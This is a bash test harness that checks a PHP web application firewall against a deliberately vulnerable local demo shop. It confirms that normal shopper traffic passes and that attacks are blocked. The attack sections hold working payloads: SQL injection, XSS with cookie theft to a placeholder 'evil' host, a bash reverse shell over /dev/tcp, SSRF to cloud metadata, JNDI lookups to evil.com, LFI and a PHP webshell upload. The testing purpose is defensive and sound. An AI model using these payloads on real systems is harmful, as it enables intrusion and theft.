#!/usr/bin/env bash
# Comprehensive WAF validation against DemoShop Pro (deliberately vulnerable site).
# Covers: normal business journeys (session cookies), attacks across every injection
# point, bypass variants, flag-leak scrubbing, honeypots, and the WAF panel UI.
set -u
HERE="D:/ccccccode/PhoenixWaf/test_web"
WAF="D:/ccccccode/PhoenixWaf/waf.php"
PORT=8090
B="http://127.0.0.1:$PORT"
J="$HERE/.cookies_shopper"; PJ="$HERE/.cookies_panel"; J2="$HERE/.cookies_admin"
rm -f "$J" "$PJ" "$J2"

cp "$WAF" "$HERE/common.inc.php"
rm -rf "$HERE/data"   # fresh demo state each run (users/reviews/orders/uploads)
PANEL_HASH=$(php -r "echo password_hash('phoenixadmin', PASSWORD_BCRYPT, array('cost'=>9));")
cat > "$HERE/.pwaf.php" <<PHP
<?php return array(
 'enabled'=>true,'key'=>'testkey','hash'=>'$PANEL_HASH','datadir'=>'$HERE',
 'log'=>'$HERE/.pwaf_log','rate_db'=>'$HERE/.pwaf_rate','integrity_db'=>'$HERE/.pwaf_int',
 'fake_flag'=>'flag{h0n3yp0t_tr4p_d0_n0t_submit}','stealth'=>false,'auto_ban'=>false,'access_log'=>false,
 'rate_limit'=>1000000,'fp_mode'=>'balanced','static_bypass'=>true,'score_threshold'=>2,
 'honeypots'=>array('/flag.txt','/shell.php','/.git/config','/phpmyadmin','/c99.php','/.env','/wp-login.php'),
 'whitelist'=>array(),'blacklist'=>array(),'checker_ips'=>array(),'custom_rules'=>array(),
 'rules'=>array('sqli'=>true,'cmdi'=>true,'lfi'=>true,'xss'=>true,'code'=>true,'ssrf'=>true,'xxe'=>true,
   'unserialize'=>true,'upload'=>true,'response'=>true,'bypass'=>true,'nosqli'=>true,'ssti'=>true,'jwt'=>true,'proto'=>true),
 'webroot'=>'$HERE');
PHP

php -d error_reporting=0 -d display_errors=0 -S 127.0.0.1:$PORT -t "$HERE" "$HERE/router.php" >/dev/null 2>&1 &
SRV=$!; trap "kill $SRV 2>/dev/null" EXIT
for i in $(seq 1 40); do [ "$(curl -s -o /dev/null -w '%{http_code}' "$B/" 2>/dev/null)" = "200" ] && break; sleep 0.3; done
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89' > "$HERE/.av.png"
printf '<?php system($_GET["c"]); ?>' > "$HERE/.shell.tmp"

P=0; F=0; declare -a FA
BLK='请求已被拦截'
_run(){ curl -s -w $'\n%{http_code}' "$@" 2>/dev/null; }
# pass NAME MARKER curl-args...
pass(){ local n="$1" m="$2"; shift 2; local o c b; o=$(_run "$@"); c="${o##*$'\n'}"; b="${o%$'\n'*}"
  if { [ "$c" = "200" ] || [ "$c" = "302" ]; } && echo "$b" | grep -qF "$m" && ! echo "$b" | grep -q "$BLK"; then P=$((P+1)); else F=$((F+1)); FA+=("PASS  [$n] http=$c want='$m'"); fi; }
# block NAME curl-args...
block(){ local n="$1"; shift; local o c b; o=$(_run "$@"); c="${o##*$'\n'}"; b="${o%$'\n'*}"
  if [ "$c" = "403" ] || echo "$b" | grep -q "$BLK"; then P=$((P+1)); else F=$((F+1)); FA+=("BLOCK [$n] http=$c NOT blocked"); fi; }
# honeypot NAME path
honey(){ local n="$1" p="$2" b; b=$(curl -s "$B$p" 2>/dev/null); if echo "$b" | grep -q "h0n3yp0t_tr4p"; then P=$((P+1)); else F=$((F+1)); FA+=("HONEY [$n] trap not sprung"); fi; }
# noflag NAME url needle
noflag(){ local n="$1" u="$2" x="$3" b; b=$(curl -s "$u" 2>/dev/null); if echo "$b" | grep -qF "$x"; then F=$((F+1)); FA+=("LEAK  [$n] secret leaked"); else P=$((P+1)); fi; }

echo "═══════════ A. NORMAL BUSINESS JOURNEYS (must pass, zero WAF impact) ═══════════"
pass "home"           "Everything for your everyday" "$B/"
pass "catalog"        "Blue Denim Jacket"    "$B/catalog.php"
pass "catalog-search" "Wireless"             "$B/catalog.php" -G --data-urlencode "q=wireless"
pass "catalog-filter" "shoes"                "$B/catalog.php" -G --data-urlencode "cat=shoes" --data-urlencode "sort=price"
pass "catalog-page2"  "Catalog"              "$B/catalog.php" -G --data-urlencode "page=2" --data-urlencode "sort=rating"
pass "product"        "Wireless Headphones"  "$B/product.php?id=3"
pass "suggest-ajax"   "suggestions"          "$B/suggest.php" -G --data-urlencode "term=run"
pass "register"       "My Account"           -L -c "$J" -b "$J" "$B/auth.php" --data "mode=register&user=charlie&pass=hunter2green"
pass "account-view"   "charlie"              -b "$J" "$B/account.php"
pass "profile-save"   "hiking"             -L -b "$J" -c "$J" "$B/account.php" --data-urlencode "display=Charlie O'Neil" --data-urlencode "city=Montréal" --data-urlencode "bio=Loves coffee, hiking & code."
pass "add-to-cart"    "Red Running Shoes"    -L -c "$J" -b "$J" "$B/cart.php" --data "add=1"
pass "add-to-cart2"   "Stainless"            -L -c "$J" -b "$J" "$B/cart.php" --data "add=5"
pass "checkout"       "Order #"              -L -b "$J" -c "$J" "$B/checkout.php" --data-urlencode "name=Charlie O'Neil" --data-urlencode "addr=123 Main St, Apt 4, Boston MA 02101"
pass "review-post"    "Great value"          -L -c "$J" -b "$J" "$B/review.php" --data-urlencode "name=Charlie" --data "stars=5" --data-urlencode "body=Great value and fast shipping. Would buy again!"
pass "contact"        "message was received" "$B/contact.php" --data-urlencode "email=me@example.com" --data-urlencode "subject=Order question" --data-urlencode "body=When will my order 1000 ship? Thanks and regards."
pass "reset"          "reset link was sent"  "$B/reset.php" --data-urlencode "email=user@example.com"
pass "files-view"     "Frequently Asked"     "$B/files.php?view=faq"
pass "files-upload"   "Uploaded"             "$B/files.php" -F "file=@$HERE/.av.png;filename=avatar.png;type=image/png"
pass "fetch-benign"   "Preview"              "$B/fetch.php" -G --data-urlencode "url=https://cdn.example.com/img/logo.png"
pass "export-csv"     "Red Running Shoes"    "$B/export.php?fmt=csv"
pass "export-json"    "Wireless"             "$B/export.php?fmt=json"
pass "render-benign"  "Hello"                "$B/render.php" -G --data-urlencode "tpl=Hello {{name}}, welcome to {{shop}}!" --data-urlencode "name=Charlie"
pass "api-ping"       '"ok":true'            "$B/api.php?action=ping"
pass "api-search"     "Wireless"             "$B/api.php" -H "Content-Type: application/json" --data '{"action":"search","q":"wireless"}'
pass "api-order-auth" '"accepted"'           "$B/api.php" -H "Content-Type: application/json" -H "X-Api-Token: demo-token-123" --data '{"action":"order","order":{"items":[1,5],"note":"leave at door"}}'
pass "login-admin"    "Admin"                -L -c "$J2" -b "$J2" "$B/auth.php" --data "mode=login&user=admin&pass=sup3rs3cret"
pass "admin-dash"     "Admin Dashboard"      -b "$J2" "$B/admin.php"
pass "admin-search"   "alice"                -b "$J2" "$B/admin.php" -G --data-urlencode "u=ali"
pass "static-css"     "DemoShop Pro"         "$B/assets/style.css"
pass "static-js"      "DemoShop Pro client"  "$B/assets/app.js"
# benign inputs that resemble attacks (false-positive guards)
pass "fp-apostrophe"  "Brien and Sons"              "$B/render.php" -G --data-urlencode "name=O'Brien and Sons"
pass "fp-orderby"     "Catalog"              "$B/catalog.php" -G --data-urlencode "q=order by relevance please"
pass "fp-and-prose"   "message was received" "$B/contact.php" --data-urlencode "subject=cats and dogs" --data-urlencode "body=between 9 and 5, ship to O'Reilly" --data-urlencode "email=a@b.com"
pass "fp-hexcolor"    "Hello"                "$B/render.php" -G --data-urlencode "name=color 0xFF8800 selected" --data-urlencode "tpl=Hello {{name}}"
pass "fp-path-date"   "Frequently"           "$B/files.php" -G --data-urlencode "view=faq"

echo "═══════════ B. WAF PANEL UI (通防前端) ═══════════"
pass "panel-login-page" "管理面板"           -c "$PJ" "$B/index.php?waf_key=testkey"
pass "panel-authed"     "PhoenixWAF"         -L -b "$PJ" -c "$PJ" "$B/index.php" --data "waf_key=testkey&pw=phoenixadmin"
pass "panel-nav-overview" "概览"             -b "$PJ" "$B/index.php?waf_key=testkey"
pass "panel-nav-rules"    "检测规则"          -b "$PJ" "$B/index.php?waf_key=testkey"
pass "panel-fpmode"       "防护强度"          -b "$PJ" "$B/index.php?waf_key=testkey"
pass "panel-fpmode-btn"   "fp-mode-btn"      -b "$PJ" "$B/index.php?waf_key=testkey"
pass "panel-stat-cards"   "stat-card"        -b "$PJ" "$B/index.php?waf_key=testkey"
pass "panel-rule-nosqli"  "NoSQL 注入"        -b "$PJ" "$B/index.php?waf_key=testkey"
pass "panel-tab-logs"     "攻击日志"          -b "$PJ" "$B/index.php?waf_key=testkey"
pass "panel-poll-json"    "blocked"          -b "$PJ" "$B/index.php?waf_key=testkey&_poll=1"
pass "panel-wrong-pw-page" "Wrong password"  -c /dev/null "$B/index.php" --data "waf_key=testkey&pw=wrongpass"

echo "═══════════ C. ATTACKS ACROSS INJECTION POINTS (must block) ═══════════"
# SQLi — GET / POST / JSON / cookie / header
block "sqli-get-q"      "$B/catalog.php" -G --data-urlencode "q=x' UNION SELECT user,pass FROM users-- -"
block "sqli-get-sort"   "$B/catalog.php" -G --data-urlencode "sort=(SELECT 1 FROM users)"
block "sqli-get-cat"    "$B/catalog.php" -G --data-urlencode "cat=x' OR '1'='1"
block "sqli-get-id"     "$B/product.php" -G --data-urlencode "id=1 AND 1=1"
block "sqli-post-login" "$B/auth.php" --data "mode=login&user=admin' or 1=1-- -&pass=x"
block "sqli-admin-u"    -b "$J2" "$B/admin.php" -G --data-urlencode "u=x' UNION SELECT 1,2,3,4-- -"
block "sqli-json-api"   "$B/api.php" -H "Content-Type: application/json" --data '{"action":"search","q":"1 AND SLEEP(5)"}'
block "sqli-cookie"     "$B/product.php?id=1" -H "Cookie: pref=1' OR '1'='1"
block "sqli-ua-header"  "$B/" -H "User-Agent: sqlmap' UNION SELECT version()-- -"
block "sqli-xff"        "$B/" -H "X-Forwarded-For: 1' AND extractvalue(1,concat(0x7e,user()))-- -"
block "sqli-blind"      "$B/product.php" -G --data-urlencode "id=1 AND ascii(substring(user(),1,1))>77"
# XSS
block "xss-get-render"  "$B/render.php" -G --data-urlencode "name=<script>alert(document.cookie)</script>"
block "xss-post-review" -c /dev/null "$B/review.php" --data-urlencode "name=x" --data-urlencode "body=<img src=x onerror=alert(1)>"
block "xss-post-profile" -b "$J" "$B/account.php" --data-urlencode "display=<svg onload=alert(1)>" --data-urlencode "city=x" --data-urlencode "bio=x"
block "xss-checkout"    -b "$J" "$B/checkout.php" --data-urlencode "name=<script>fetch('//evil/'+document.cookie)</script>" --data-urlencode "addr=x"
block "xss-suggest"     "$B/suggest.php" -G --data-urlencode "term=<script>alert(1)</script>"
block "xss-referer"     "$B/" -H "Referer: http://x/<script>alert(1)</script>"
# LFI
block "lfi-files-view"  "$B/files.php" -G --data-urlencode "view=../../../../etc/passwd"
block "lfi-filter"      "$B/files.php" -G --data-urlencode "view=php://filter/convert.base64-encode/resource=index"
# RCE / code
block "rce-export"      "$B/export.php" -G --data-urlencode "fmt=csv;cat /etc/passwd"
block "rce-subshell"    "$B/export.php" -G --data-urlencode "fmt=\$(id)"
block "rce-revshell"    "$B/export.php" -G --data-urlencode "fmt=x;bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
block "code-api-eval"   "$B/api.php" -H "Content-Type: application/json" --data '{"action":"calc","calc":"eval($_GET[x])"}'
# SSRF
block "ssrf-metadata"   "$B/fetch.php" -G --data-urlencode "url=http://169.254.169.254/latest/meta-data/"
block "ssrf-localhost"  "$B/fetch.php" -G --data-urlencode "url=http://127.0.0.1:6379/"
block "ssrf-gopher"     "$B/fetch.php" -G --data-urlencode "url=gopher://127.0.0.1:6379/_flushall"
# SSTI
block "ssti-math"       "$B/render.php" -G --data-urlencode "tpl={{7*7}}"
block "ssti-class"      "$B/render.php" -G --data-urlencode "tpl={{''.__class__.__mro__[1].__subclasses__()}}"
# upload
block "upload-webshell" "$B/files.php" -F "file=@$HERE/.shell.tmp;filename=shell.php;type=image/jpeg"
block "upload-htaccess" "$B/files.php" -F "file=@$HERE/.shell.tmp;filename=.htaccess;type=text/plain"
# NoSQL / XXE / deser
block "nosql-login"     "$B/auth.php" --data 'mode=login&user[$ne]=1&pass[$ne]=1'
block "nosql-json"      "$B/api.php" -H "Content-Type: application/json" --data '{"action":"search","q":{"$where":"return this.pw"}}'
block "xxe-api"         "$B/api.php" -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
block "deser-id"        "$B/product.php" -G --data-urlencode 'id=O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}'
# header injection
block "crlf-contact"    "$B/contact.php" --data-urlencode "subject=x%0d%0aBcc:evil@x.com" --data-urlencode "email=a@b.com" --data-urlencode "body=hi"
# scanner honeypots
honey "hp-shell"   "/shell.php"
honey "hp-git"     "/.git/config"
honey "hp-flagtxt" "/flag.txt"
honey "hp-env"     "/.env"
honey "hp-wp"      "/wp-login.php"

echo "═══════════ D. BYPASS / EVASION VARIANTS (must block) ═══════════"
block "byp-url2enc"    "$B/product.php" -G --data-urlencode "id=%2527%2520UNION%2520SELECT%25201--"
block "byp-vercomment" "$B/catalog.php" -G --data-urlencode "q=x'/*!50000UNION*//*!50000SELECT*/1,2 FROM users-- -"
block "byp-vc-split"   "$B/catalog.php" -G --data-urlencode "q=x'/*!50000UN*/ION/*!50000SELE*/CT pw FROM users-- -"
block "byp-case-ws"    "$B/product.php" -G --data-urlencode "id=1%0bUnIoN%0bSeLeCt%0b1,2"
block "byp-quotebreak" "$B/export.php"  -G --data-urlencode "fmt=x;c''at /etc/passwd"
block "byp-backslash"  "$B/api.php" -H "Content-Type: application/json" --data '{"action":"calc","calc":"\\s\\y\\stem(1)"}'
block "byp-xss-slash"  "$B/render.php" -G --data-urlencode "name=<img/onerror=alert(1) src=x>"
block "byp-xss-quote"  "$B/render.php" -G --data-urlencode 'name=<img src="x"onerror=alert(1)>'
block "byp-xss-attr"   "$B/render.php" -G --data-urlencode 'name=" onmouseover=alert(document.cookie) x="'
block "byp-js-scheme"  "$B/render.php" -G --data-urlencode "name=<a href=java%09script:alert(1)>x</a>"
block "byp-ssrf-dec"   "$B/fetch.php"  -G --data-urlencode "url=http://2130706433/"
block "byp-ssrf-oct"   "$B/fetch.php"  -G --data-urlencode "url=http://0177.0.0.1/"
block "byp-ssrf-ipv6"  "$B/fetch.php"  -G --data-urlencode "url=http://[0:0:0:0:0:0:0:1]/"
block "byp-ssrf-user"  "$B/fetch.php"  -G --data-urlencode "url=http://foo@127.0.0.1:8080/"
block "byp-b64-shell"  "$B/api.php" -H "Content-Type: application/json" --data '{"x":"c3lzdGVtKCdpZCcpOw"}'
block "byp-b64url"     "$B/api.php" -H "Content-Type: application/json" --data '{"x":"PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs_Pg"}'
block "byp-jwt-none"   "$B/product.php?id=1" -H "Cookie: session=eyJhbGciOiJub25lIn0.eyJ1IjoiYSJ9."
block "byp-jwt-space"  "$B/product.php?id=1" -H "Cookie: t=eyAiYWxnIjoibm9uZSJ9.eyJ1IjoiYSJ9."
block "byp-overlong"   "$B/files.php" -G --data-urlencode "view=..%c1%9c..%c1%9cetc/passwd"
block "byp-jndi"       "$B/render.php" -G --data-urlencode 'name=${jndi:${lower:l}dap://evil.com/a}'

echo "═══════════ E. FLAG LEAK — L2 response hook must scrub ═══════════"
REAL='flag{D3M0SH0P_PR0_r00t_a1b2c3d4e5f6}'
noflag "leak-plain" "$B/flag.php?fmt=plain" "$REAL"
noflag "leak-b64"   "$B/flag.php?fmt=b64"   "$(php -r "echo base64_encode('$REAL');")"
noflag "leak-hex"   "$B/flag.php?fmt=hex"   "$(php -r "echo bin2hex('$REAL');")"
noflag "leak-rev"   "$B/flag.php?fmt=rev"   "$(php -r "echo strrev('$REAL');")"
noflag "leak-url"   "$B/flag.php?fmt=url"   "$(php -r "echo rawurlencode('$REAL');")"
noflag "leak-json"  "$B/flag.php?fmt=json"  "$REAL"
noflag "leak-html"  "$B/flag.php?fmt=html"  "$REAL"

echo ""
echo "═══════════════════════════════════════════════════════"
echo "RESULT: $P passed, $F failed  (total $((P+F)))"
if [ $F -gt 0 ]; then printf ' ✗ %s\n' "${FA[@]}"; exit 1; fi
echo "✓ ALL TESTS PASSED — normal traffic clean, attacks blocked, panel UI OK, flags scrubbed"
